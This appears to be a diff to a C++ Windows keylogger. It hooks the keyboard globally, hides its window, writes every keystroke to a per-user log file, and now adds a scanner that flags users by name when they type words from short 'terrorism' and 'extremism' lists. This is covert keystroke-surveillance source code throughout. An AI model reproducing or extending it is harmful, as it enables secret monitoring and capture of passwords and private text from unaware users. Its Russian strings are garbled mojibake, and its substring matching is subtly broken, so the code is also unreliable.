@@ -9,10 +9,25 @@
 #include <chrono>
 #include <thread>
 #include <iomanip>
+#include <vector>
 
 using namespace std;
 
+enum Rangs 
+{
+	Terrorism,
+	Extrimism
+};
+
 const string fileName = "logfile.txt";
+const string badWordsTerrorism[] = { "BAD", "NFC","IGIL"};
+const string badWordsExtrimism[] = { "BOMB", "TNT" };
+
+vector<char> buffer;
+
+const int maxWordLength = 4;
+const int badWordsTerrorismSize = 3;
+const int badWordsExtrimismSize = 2;
 
 string name;
 string lastTime;
@@ -20,6 +35,9 @@ string path;
 bool isPressed;
 bool state = false;
 bool admin = false;
+
+bool wasTerrorism = false;
+bool wasExtrimism = false;
 
 #pragma region FUNCTION_SIGNATURES
 LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
@@ -73,15 +91,55 @@ string GetTime()
 void Log(string text) 
 {
 	ofstream logfile;
-	logfile.open(path+fileName, fstream::app);
+	logfile.open(path + name + ".txt", fstream::app);
 	logfile << text;
 	logfile.close();
+}
+
+void LogRange(string text)
+{
+	ofstream logfile;
+	logfile.open(path + name + ".txt", fstream::app);
+	logfile << "\n"+text+"\n";
+	logfile.close();
+}
+
+void LogStep(Rangs ranges) 
+{
+	ofstream logfile;
+	logfile.open(path + "peoles.txt", fstream::app);
+
+	switch (ranges)
+	{
+	case Terrorism:
+		if (!wasTerrorism) {
+			if (wasExtrimism) {
+				logfile <<",{TERRORISM}";
+			}
+			else {
+				logfile << "\n" + GetTime() + name + "{TERRORISM}";
+			}
+			wasTerrorism = true;
+		}
+		break;
+	case Extrimism:
+		if (!wasExtrimism) {
+			if (wasTerrorism) {
+				logfile << ",{EXTRIMISM}";
+			}
+			else {
+				logfile << "\n" + GetTime() + name + "{EXTRIMISM}";
+			}
+			wasExtrimism = true;
+		}
+		break;
+	}
 }
 
 void Log(char key)
 {
 	ofstream logfile;
-	logfile.open(path + fileName, fstream::app);
+	logfile.open(path + name+".txt", fstream::app);
 	if (lastTime != GetTime()) 
 	{
 		logfile <<"\n"<< GetTime() << " " << key;
@@ -111,6 +169,8 @@ void OpenAdminMenu()
 			state = false;
 			break;
 		case 3:
+			wasExtrimism = false;
+			wasTerrorism = false;
 			cout << "¬‚Â‰ËÚÂ ÔÛÚ¸";
 			cin >> path;
 			cout << "¬‚Â‰ËÚÂ ËÏˇ ÔÓÎ¸ÁÓ‚‡ÚÂÎˇ";
@@ -134,6 +194,56 @@ void OpenAdminMenu()
 	}
 	admin = false;
 	Hide();
+}
+
+void AddAndCheckVector(const char symb) 
+{
+	buffer.insert(buffer.end(),symb);
+
+	for (int i = 0; i < badWordsTerrorismSize;i++) 
+	{
+		string buf = badWordsTerrorism[i];
+		string vBuf(buffer.begin(), buffer.end());
+
+		for (int i = 0; i < vBuf.length(); i++) 
+		{
+			if (i + buf.length() > vBuf.length()) 
+			{
+				break;
+			}
+
+			if (vBuf.substr(i, i + buf.length()) == buf) 
+			{
+				LogRange("œŒÀ‹«Œ¬¿“≈À‹ ¬¬≈À —ÀŒ¬Œ Œ“ÕŒ—ﬂŸ≈≈—ﬂ    ¿“≈√Œ–»»:{TERRORISM} —ÀŒ¬Œ:" + buf);
+				LogStep(Rangs::Terrorism);
+			}
+		}
+	}
+
+	for (int i = 0; i < badWordsExtrimismSize; i++)
+	{
+		string buf = badWordsExtrimism[i];
+		string vBuf(buffer.begin(), buffer.end());
+
+		for (int i = 0; i < vBuf.length(); i++)
+		{
+			if (i + buf.length() > vBuf.length())
+			{
+				break;
+			}
+
+			if (vBuf.substr(i, i + buf.length()) == buf)
+			{
+				LogRange("œŒÀ‹«Œ¬¿“≈À‹ ¬¬≈À —ÀŒ¬Œ Œ“ÕŒ—ﬂŸ≈≈—ﬂ    ¿“≈√Œ–»»:{EXTRIMISM} —ÀŒ¬Œ:" + buf);
+				LogStep(Rangs::Extrimism);
+			}
+		}
+	}
+
+	if (buffer.size() >= maxWordLength)
+	{
+		buffer.erase(buffer.begin());
+	}
 }
 
 LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
@@ -193,6 +303,7 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 				break;
 			default:
 				Log((char)code);
+				AddAndCheckVector((char)code);
 				break;
 			}
 			break;
